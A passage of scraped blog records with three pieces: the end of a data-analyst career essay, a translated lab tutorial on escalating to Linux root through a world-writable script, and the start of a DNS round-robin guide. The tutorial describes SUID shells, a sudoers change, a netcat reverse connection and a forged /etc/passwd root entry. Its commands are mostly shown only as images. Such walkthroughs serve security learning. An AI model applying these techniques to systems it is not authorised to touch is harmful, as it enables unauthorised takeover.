塑造更好的自己。</p>\n<h3>三、3-5年，“技多不压身”，拓展能力边界</h3>\n<p>当迈过了最初的3个年头后，你的技术越来越好，也做了不少项目，也越来越清楚自己未来的方向，但你也会发现有越来越多的东西还需要去学习和加强。</p>\n<p>这个时候，你的知识是零散的，还远未形成体系。你也许还需要花些时间好好梳理和总结过去几年积累的经验和知识，不断沉淀，形成自己的知识体系和方法论。在梳理的过程中，你会不断清楚自己有什么，缺什么，哪些地方弱，哪些地方强，未来需要花多少时间补强哪项技能，等等。</p>\n<p>你可以沿着数据的整个流程，即数据采集、数据存储、数据处理、数据分析/开发模型、报表计算、数据可视化，不断拓展自己的能力边界，最好在流程中的各个环节都做过项目。</p>\n<p>例如，在数据采集环节，你可以学一下爬虫技术。</p>\n<p>这个时候，你不再是新人。新人大多是等着别人安排工作，并在详细的指导之下完成。而你慢慢成长为老司机了，需要独立完成一个个任务了，如独立开发一个模型、写一份会员分析报告、梳理关于近期营业额下降原因分析的思路，等等。你需要不断适应在无人指点的情况自己去寻求问题解决办法，也可能需要应对此前没有遇到过的新情况并独立展开调查研究。几乎没有人帮你，你也没法指望别人明确告诉你怎么做。而你需要的是，历经3年之后成长路上的一个质变。</p>\n<p>在这过程中，你可能需要不断查找资料，咨询别人，并加以思考，梳理出有效的方案，最后落地执行。在这过程中，可以有效训练以下几方面的能力：</p>\n<ul class=\"list-paddingleft-2\">\n<li>查找资料</li>\n<li>会问问题</li>\n<li>总结梳理</li>\n<li>写作能力</li>\n</ul>\n<p>关于总结梳理，建议定期做，常常做，每天做，建议养成一个日常习惯。</p>\n<p>对于不同问题和场景的思路整理总结，常常需要方法论指导，如麦肯锡金字塔原理、结构化思维等。关于这些方法论，不仅要谙熟于心，也需要将其应用到实际工作当中。这是受用一生的知识，你也可将其运用到你的日常生活中，用以解决你日常的问题和需求。</p>\n<p>关于思路的整理，可以借助思维导图工具。</p>\n<p>另外，请注重培养自己的数据敏感性和数据思维，越早开始越好。关于如何培养数据思维，将以另外的文章单独阐述。</p>\n<p>EXCEL是操作和处理数据最方便的工具，也是必须掌握的办公软件。很多人会用EXCEL，但根本不精通EXCEL。简历里那句“精通EXCEL等办公软件”（你的简历里是否也这样写~~），常常是一个谎言。建议你好好学一下EXCEL，包括展示数据、透视表、函数、画图、动态图表、VBA等。不要仅仅停留在最粗的层面，比如画图，使用默认设置也可以画出一个图表，但是不好看，阅读体验不好。关于怎么用EXCEL画好图表，推荐阅读《EXCEL图表演示之道》、《最简单的图形与最复杂的信息》。</p>\n<p>写分析报告，难免会用到PPT。关于如何写好PPT这件事，从来就不是件轻松的事。但你可以给自己一些时间去学，比如3年、5年、甚至10年。刚开始，写得不好没关系，但一定不要放过每一次锻炼的机会。</p>\n<p>关于PPT的技巧，将有更多的文章单独阐述。</p>\n<p>在领导眼里，会写材料的人比会编程的人更有存在感。而且，会写材料的人总是显得那样“稀缺”。如果你是别的同事眼里的“会Coding的人中最会写PPT+会写材料的人中最懂技术”的那个人，那你将会很受重用。</p>\n<h3>四、5-10年，“不忘初心”，有所为有所不为</h3>\n<p>在别人眼里，数据分析和开发模型是很高大上的。但这高大上，常常处在很多尴尬的处境。数据分析汇报一次之后就没了下文，模型开发了，部署了，也定期出数了，但就是没用起来。用户方或业务方觉得这些东西对他们业务帮助不大，可有可无（虽然包装一下用来忽悠一下投资人可能也有点用处），还不如一个经验规则来得有效，简单粗暴，省时省力。</p>\n<p>关于经验规则和算法模型之争，如果你坚定认为你开发的模型比业务方所认为的经验规则更有效，那么，请你拿出“证据”，用数据说服业务方，让他们改变观念，觉得你是对的。</p>\n<p>之前信奉的那句“数据驱动业务”，是不是错了吗？</p>\n<p>此刻，请回到初心吧！我们的初心是什么？那就是用数据帮助业务解决问题，用数据辅助业务决策。数据分析只是其中一种形式，当然还有其它。因此，不要迷恋数据分析，不要迷恋算法模型。“不管黑猫白猫，抓到老鼠就是好猫。”</p>\n<p>如果你能够从数据分析和算法模型的困囿中挣脱出来，那么你将发现你面对的是广阔天地，你可以在数据的海洋里肆意遨游。</p>\n<p>你或许开始注重追求数据解决方案的实用性，强调落地执行，更看重应用效果。</p>\n<p>你必须真正理解业务方的需求。当业务方进行选品和定价时，他们需要一份关于竞品的商品数据来做参考；当业务方想随时看到当前时刻的订单量（特别是618或双11），你需要实时汇总数据并实时呈现给他们；当业务方既想看总体的经营数据，也想看各区各部门各门店的经营数据，你需要开发一个多维度层层钻取查看的功能……而这些都不是数据分析和算法模型，但这些也是数据应用，也能产生数据价值。</p>\n<p>如果有机会，不妨尝试做个数据产品经理。数据产品经理需要从产品角度实现业务功能。在当前数据产品化的趋势下，这是一个很有挑战性的事情，不容易做好。毕竟，讨好一大群用户，比单独讨好一个用户要难得多。</p>\n<p>在数据产品设计里，数据可视化是一个重要的事情。好的图表会说话，好的功能会抓住用户的心。即便撇开数据产品，我们在分析报告里也会需要数据的可视化表达。</p>\n<p>数据可视化传递的是一种明确的数据信息，一目了然，赏心悦目。从画好一个数据图表，到功能版式的精心设计，再到对功能细节良苦用心的把握，你需要不断精进。一旦你感兴趣，你将会很快沉迷于其中，因为那是一种美的表达。</p>\n<h3>五、10年+，“砥砺前行”，创新、创业、创造</h3>\n<p>是的，你已经做了十年，希望你无悔当初的选择与坚持。</p>\n<p>此时你也遇到很多瓶颈，或许你空有一身好武艺但得不到老板重用，或许你想做个实力派但处于各种原因离技术越来越远，或许你很努力但职务仍然上不去，或许你面对繁重的工作心有余而力不足，各种分身乏术……你一直在等待和寻找着机会，突破自己。</p>\n<p>此时你也渐渐步入了中年，或许你开始变得油腻，或许你的身材早已远离苗条，或许岁月在你的脸上、头发上开始留下痕迹，或许你的思想渐渐固化，不能与时俱进了……最重要的，或许就是你早已没有了当初的激情。</p>\n<p>如果你在一个行业待了十年，在别人眼里，无论怎样，都已是个专家，所以，请自信！</p>\n<p>你还需要在圈里有一定的影响力，需要树立个人品牌，最好能在圈里外有较好的传播。如此这样，当别人提起你的时候，他们常会这样说，“这个人分析能力很强”，“他在数据领域造诣很深”，“他建模能力出众”……如此种种，在他们眼里对你印象最深刻的标签将会是你最想要的那个。</p>\n<p>或许你需要逐步提升讲课程的能力，这是一种知识分享与传递，也是提高个人影响力的有效途径。不要放过任何露脸的机会哦！</p>\n<p>你或许已经深刻明白，分析的结果、开发的模型、数据产品只有被应用起来，才真正算是产生价值。你会越来越关注数据应用的问题。当你开始聚焦这个问题时，你会问自己，”用户或业务方真正需要什么？“这个时候，你得有用户思维了。你会加强对业务的重视程度，也会不断回到业务层面去思考数据的实际应用。</p>\n<p>你最好也时刻关注当前社会的趋势和潮流，特别是与互联网相关的。这样可以让你保持开放的心态，洞悉社会的风向，驱动自己的思考，挖掘潜在的机会。你可以从中了解当前行业中成功的数据应用案例，开拓自己的思路，多想想用数据还可以帮助各行业解决什么问题，可能的机会在哪里，自己应该怎么做。</p>\n<p>你可能要面对的是，数据应用对一个行业或一个企业来说，永远都是在探索。某个数据应用思路或项目一旦成功了，就会得到越来越多的资源投入，越做越大，如果失败了，就会立刻遭放弃。因此，要有创新精神，要有创新的勇气和自信。</p>\n<p>职位上来说，你可能开始担任一定的管理工作。因此，你还得学会团队管理，懂得如何向上管理和向下管理。</p>\n<p>你的日常事务会越来越多，你也需要学会有效管理自己的时间。你可以成为一名“清单控”。但必须指出的是，时间管理，最本质的还是自我的管理，对精力的管理。你需要开始意识到加强身体锻炼的重要性了。一来，保持身材，对发福说不，二来，保持精力的旺盛，抵抗疲倦，第三，通过不断挑战自己的身体极限来刺激自己，找回激情。</p>\n<p>你也需要开始认真考虑如何平衡工作和家庭的问题了。</p>\n<p>这个世界一直在变。我们也一定要“善变”，顺势而为。</p>\n<p>不管是10-20年前的BI（商务智能），过去几年的大数据，这年头炒得火爆的人工智能，还是未来涌现的更多概念，只要我们足够开放，敏感洞察，挖掘机会，创新、创业、创造，不断成就自己。</p>\n<p>汪国真在《热爱生命》里写道：“我不去想是否能够成功，既然选择了远方，便只顾风雨兼程。”</p>\n<p>英雄不问出身，只要你下定决心，即使再晚出发，也会达到，还可以走得更远。</p>\n<p>最后，作为数据人，与你共勉，“不做数据的搬运工，要做价值的缔造者”。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114150\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114150votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114150\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "其他,数据分析", "author": "作者 JerryHuang 推荐", "front_image_path": "full/3ef52bc5d5cc6d23e102e0ce679d152bdd3b5cc7.jpg"}
{"title": "通过可写文件获取 Linux root 权限的 5 种方法", "createdate": "2018/06/26", "url": "http://blog.jobbole.com/114159/", "url_object_id": "cbb3b429719bda3e099c2522f8c301a8", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "thumbs": 2, "bookmark": 1, "comments": 1, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/\">Raj Chandel</a>   译文出处：<a target=\"_blank\" href=\"http://www.4hou.com/technology/12134.html\">ang010ela</a>   </div><p>Linux系统中，全部都是以文件形式存在的，包括目录、设备都是有权限的，共有读、写、可执行三种。管理员为文件设置好权限后，应该要考虑哪些Linux用户会被允许和限制上述的三个权限。</p>\n<p>通过可写脚本进行root提取的5种方法：</p>\n<p><strong>· </strong>复制 /bin/sh 到 /tmp</p>\n<p><strong>· </strong>设定 /bin/dash的SUID位</p>\n<p><strong>· </strong>通过sudoer给登录用户完全的权限</p>\n<p><strong>· </strong>设定/bin/cp的SUID位</p>\n<p><strong>· </strong>逆向连接到恶意代码</p>\n<p>开启攻击机器，黑掉目标系统，然后进行权限提升。假设成功地通过ssh登录到受害者的机器，并可以访问非root的用户终端。然后使用下面的命令，下面会举例所有有写权限的二进制文件。</p>\n<p><img class=\"aligncenter\" title=\"1529412592363232.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1e7977c9bc9757738b3a866488ea5d62.png\" alt=\"image.png\"></p>\n<p>可以看到一个/lib/log中保存的python文件，在路径中我们看到了sanitizer.py文件的权限为777。</p>\n<p><img class=\"aligncenter\" title=\"1529412639504718.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/964f0d836515a1f465fa5dc271d2f0a1.png\" alt=\"image.png\"></p>\n<p>Admin要将下面的脚本加入，来清理/tmp中的垃圾文件。如果攻击者能够识别受害者机器中的这类情形，就可以通过下面的方式来提升root权限来破坏系统。</p>\n<p><img class=\"aligncenter\" title=\"1529412656940436.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/39214efb2063fa48217699186079c317.png\" alt=\"image.png\"></p>\n<p><strong>第一种方法</strong></p>\n<p>有许多的方法可以获取root权限，本方法中，我们将/bin/sh复制到/tmp文件夹中，然后设置/tmp/sh的SUID。这种方式非常简单，首先，通过nano编辑器打开文件，然后用rm -r /tmp/* 替换下面的命令：</p>\n<p><img class=\"aligncenter\" title=\"1529412681445056.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/dcf60a5fe3c007b80794b0c24ce5f6af.png\" alt=\"image.png\"></p>\n<p>在/tmp目录创建一个有SUID权限的sh文件后，允许sh文件时会有root访问权限。</p>\n<p><img class=\"aligncenter\" title=\"1529412695478987.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/0d5093e8d17512913d21f495b117af49.png\" alt=\"image.png\"></p>\n<p>可以通过下面的图片进行确认：</p>\n<p><img class=\"aligncenter\" title=\"1529412712243123.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/205448a574dc96c889344dc9dafdd8cb.png\" alt=\"image.png\"></p>\n<p><strong>第二种方法</strong></p>\n<p>同样地，可以用rm -r /tmp/* 替换下面行的内容</p>\n<p><img class=\"aligncenter\" title=\"1529412732150633.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/bed4185b31699ce45bfaf3c5619ec88e.png\" alt=\"image.png\"></p>\n<p>在设置了/bin/dash的SUID权限后，运行后就可以获取root权限</p>\n<p><img class=\"aligncenter\" title=\"1529412745399156.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/34b3b42d097322d3fe33db6881f6dc11.png\" alt=\"image.png\"></p>\n<p>可以通过下面的图进行确认：</p>\n<p><img class=\"aligncenter\" title=\"1529412761544191.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/a44576fbd2965f44814965d14a2c9baf.png\" alt=\"image.png\"></p>\n<p><strong>第三种方法</strong></p>\n<p><img class=\"aligncenter\" title=\"1529412774505929.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1472d7a6a5b70fd0a5caa935b6495cd7.png\" alt=\"image.png\"></p>\n<p>通过netcat逆向了连接后，就可以获取root权限。</p>\n<p>可以通过下面的图进行确认：</p>\n<p><img class=\"aligncenter\" title=\"1529412789517187.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/297bcaf946124ac842925a0ac6a82d09.png\" alt=\"image.png\"></p>\n<p><strong>第4种方法</strong></p>\n<p>另一个方法是给登录的用户sudo权限。下面的图中可以看出当前用户wernerbrandes不能允许sudo命令。</p>\n<p><img class=\"aligncenter\" title=\"1529412804140224.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/253ff8bf45823dc36d7dfd382bdd1ad5.png\" alt=\"image.png\"></p>\n<p>同样地，可以在下面替换rm -r /tmp/*</p>\n<p><img class=\"aligncenter\" title=\"1529412823891649.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/2526a8e7e2c6b56429b1401b51f05ecd.png\" alt=\"image.png\"></p>\n<p>当输入“sudo -l”命令时会发现，这是sudo用户的一个成员。可以利用sudo bash来获取root权限。</p>\n<p><img class=\"aligncenter\" title=\"1529412835748075.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/c7880f8f99521d379c511cead4b8d7a0.png\" alt=\"image.png\"></p>\n<p><strong>第5种方法</strong></p>\n<p>因为在linux类系统中，passwd文件起着很重要的作用。所以，如果攻击者有机会修改passwd文件，那么这将会成为一种动态的权限提升的方式。<br>\n同样地，可以利用cat命令查看etc/passwd文件的内容。<br>\nUID:1000 &amp; GID:1000 就是admin组队成员。下面编辑一下nemo记录来使其成为root组成员，选择etc/passwd的整个内容并复制粘贴到空text文件中。</p>\n<p><img class=\"aligncenter\" title=\"1529412862186777.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/c0fac052f49554a228dd7921afb830fb.png\" alt=\"image.png\"></p>\n<p>然后，在一个新的终端上生成一个含salt的密码，然后复制。</p>\n<p><img class=\"aligncenter\" title=\"1529412882678813.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1aa9b7caf0e0a26b773e5ddc1dd36a89.png\" alt=\"image.png\"></p>\n<p>然后粘贴之前复制的含salt的密码在用户nemo的记录词条的X位置处，并修改UID&amp;GID为0:0。完成上面的步骤后，我们就可以将其保存为passwd。</p>\n<p><img class=\"aligncenter\" title=\"1529412899438763.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/39851bc754c3333d3391754370ca9198.png\" alt=\"image.png\"></p>\n<p>利用可写的脚本替换 “rm -r /tmp/*”</p>\n<p><img class=\"aligncenter\" title=\"1529412924674942.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1ac119b231c99b98f495d4b68d07401c.png\" alt=\"image.png\"></p>\n<p>设置/bin/cp的SUID来复制文件。</p>\n<p><img class=\"aligncenter\" title=\"1529412935719677.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/7f7a038894570cdee6341602844bb360.png\" alt=\"image.png\"></p>\n<p>将修改后的passwd文件下载受害者机器的/tmp文件夹中。用下面的命令检查/bin/cp的SUID位是否开启。</p>\n<p><img class=\"aligncenter\" title=\"1529412953595227.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/a8322a3d2072ceb1a4b10099f03dec36.png\" alt=\"image.png\"></p>\n<p>下面确认是否改变了passwd文件的内容：</p>\n<p><img class=\"aligncenter\" title=\"1529412972236235.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/d2e4f2d6ee16c639cfcc3fe0516161f5.png\" alt=\"image.png\"></p>\n<p>可以看出passwd文件中的变化：</p>\n<p><img class=\"aligncenter\" title=\"1529412987405083.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/0dae580655080853330e9dc34bf88e6e.png\" alt=\"image.png\"></p>\n<p>可以执行下面的命令来获取root权限：</p>\n<p><img class=\"aligncenter\" title=\"1529413000676512.png\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/19e39ae621feb388e358cd0783dd0cff.png\" alt=\"image.png\"></p>\n<p>本文证明了攻击者如何通过可写文件进行linux系统权限提升。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114159\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114159votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114159\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "IT技术,Linux", "author": "Raj Chandel", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"}
{"title": "在 Linux 上用 DNS 实现简单的负载均衡", "createdate": "2018/06/25", "url": "http://blog.jobbole.com/114157/", "url_object_id": "1d572c5a3d4363cbf04c9d85ab99bc4e", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "thumbs": 1, "bookmark": null, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linux.com/learn/intro-to-linux/2018/3/simple-load-balancing-dns-linux\">Carla Shroder</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9777-1.html\">Linux中国/qhwdw</a>   </div><blockquote><p>DNS 轮询将多个服务器映射到同一个主机名，并没有为这里展示的魔法做更多的工作。</p></blockquote>\n<p>如果你的后端服务器是由多台服务器构成的，比如集群化或者镜像的 Web 或者文件服务器，通过负载均衡器提供了单一的入口点。业务繁忙的大型电商在高端负载均衡器上花费了大量的资金，用它来执行各种各样的任务：代理、缓存、状况检查、SSL 处理、可配置的优先级、流量整形等很多任务。</p>\n<p>但是你并不需要做那么多工作的负载均衡器。你需要的是一个跨服务器分发负载的简单方法，它能够提供故障切换，并且不太在意它是否高效和完美。DNS 轮询和使用轮询的子域委派是实现这个目标的两种简单方法。</p>\n<p>DNS 轮询是将多台服务器映射到同一个主机名上，当用户访问 <code>foo.example.com</code> 时多台服务器都可用于处理它们的请求，使用的就是这种方式。</p>\n<p>当你有多个子域或者你的服务器在地理上比较分散时，使用轮询的子域委派就比较有用。你有一个主域名服务器，而子域有它们自己的域名服务器。你的主域名服务器将所有的到子域的请求指向到它们自己的域名服务器上。这将提升响应时间，因为 DNS 协议会自动查找最快的链路。</p>\n<h3 id=\"toc_1\">DNS 轮询</h3>\n<p>轮询和旅鸫鸟robins没有任何关系，据我相熟的图书管理员说，它最初是一个法语短语，<em>ruban rond</em>、或者 <em>round ribbon</em>。很久以前，法国政府官员以不分级的圆形、波浪线、或者直线形状来在请愿书上签字，以盖住原来的发起人。</p>\n<p>DNS 轮询也是不分级的，简单配置一个服务器列表，然后将请求转到每个服务器上。它并不做真正的负载均衡，因为它根本就不测量负载，也没有状况检查，因此如果一个服务器宕机，请求仍然会发送到那个宕机的服务器上。它的优点就是简单。如果你有一个小的文件或者 Web 服务器集群，想通过一个简单的方法在它们之间分散负载，那么 DNS 轮询很适合你。</p>\n<p>你所做的全部配置就是创建多条 A 或者 AAAA 记录，映射多台服务器到单个的主机名。这个 BIND 示例同时使用了 IPv4 和 IPv6 私有地址类：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a47c37dd842226559\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfileserv.example.com. IN A 172.16.10.10\r\nfileserv.example.com. IN A 172.16.10.11\r\nfileserv.example.com. IN A 172.16.10.12\r\n\r\nfileserv.example.com. IN AAAA fd02:faea:f561:8fa0:1::10\r\nfileserv.example.com. IN AAAA fd02:faea:f561:8fa0:1::11\r\nfileserv.example.com. IN AAAA fd02:faea:f561:8fa0:1::12\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37dd842226559-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37dd842226559-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37dd842226559-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37dd842226559-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37dd842226559-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37dd842226559-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37dd842226559-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37dd842226559-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37dd842226559-1\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.10.10</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37dd842226559-2\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.10.11</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37dd842226559-3\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.10.12</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37dd842226559-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37dd842226559-5\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">10</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37dd842226559-6\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">11</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37dd842226559-7\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">12</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37dd842226559-8\"> 